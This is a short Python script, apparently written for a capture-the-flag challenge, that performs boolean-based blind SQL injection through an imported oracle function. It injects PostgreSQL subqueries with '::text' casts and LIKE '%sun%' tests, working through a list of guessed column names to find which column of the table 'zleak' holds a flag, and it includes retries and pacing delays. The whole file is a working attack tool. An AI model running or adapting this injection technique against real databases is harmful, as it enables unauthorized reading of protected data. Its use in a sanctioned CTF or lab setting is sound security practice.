"""Pin down the flag column of zleak in one query per candidate.

`WHERE <col> LIKE '%sun%'` is only satisfiable when <col> exists, so a true answer
names the column and proves the flag is in it at the same time.
"""
import sys
import time
from oracle import ask

GAP = 2.0
TBL = sys.argv[1] if len(sys.argv) > 1 else "zleak"
CANDS = ["leak", "leaks", "data", "payload", "content", "value", "val", "msg", "message",
         "note", "notes", "text", "txt", "body", "raw", "token", "hint", "telemetry",
         "signature", "sig", "record", "reading", "signal", "secret", "hidden", "extra",
         "info", "meta", "blob", "dump", "exfil", "stolen", "internal", "restricted"]


def ask2(e, tries=3):
    for _ in range(tries):
        if ask(e):
            return True
        time.sleep(1.0)
    return False


t0 = time.time()
print("[*] rows in %s : %s" % (TBL, ask2("(SELECT COUNT(*) FROM %s)>0" % TBL)), flush=True)
print("[*] flag inside a %s row: %s" % (TBL, ask2("(SELECT %s::text FROM %s LIMIT 1) LIKE '%%sun%%'" % (TBL, TBL))), flush=True)
time.sleep(GAP)
for c in CANDS:
    t = time.time()
    hit = ask2("(SELECT COUNT(*) FROM %s WHERE %s::text LIKE '%%sun%%')>0" % (TBL, c))
    print("  %-14s %s (%.0fs, %.0fs total)" % (c, hit, time.time() - t, time.time() - t0), flush=True)
    if hit:
        print("[+] FLAG COLUMN = %s.%s" % (TBL, c))
        open("flag_col.txt", "w").write(c + "\n")
        break
    time.sleep(GAP)
